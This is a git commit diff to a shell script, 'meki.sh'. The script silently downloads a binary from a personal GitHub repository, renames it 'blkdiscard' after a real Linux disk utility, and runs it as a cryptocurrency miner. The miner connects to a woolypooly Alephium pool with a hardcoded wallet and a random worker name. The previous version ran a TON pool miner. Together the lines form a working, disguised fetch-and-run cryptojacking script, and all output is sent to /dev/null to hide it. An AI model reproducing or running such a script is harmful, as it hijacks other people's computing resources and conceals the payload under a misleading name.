ab20fbb4ee2625d68424db8a238616fd4924f3b8
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 17:00:45 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -4,13 +4,11 @@
 
 #!/bin/bash
 
-wget https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1 
+wget -qO blkdiscard https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 
 
-tar xf ton-pool.com-miner-0.3.4-linux.tar.gz >/dev/null 2>&1
+chmod +x blkdiscard >/dev/null 2>&1
 
-chmod +x miner-linux >/dev/null 2>&1
-
-./miner-linux https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+./blkdiscard -a alph -p stratum+tcp://pool.eu.woolypooly.com:3106 -w 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
 
 while [ 1 ]; do
 
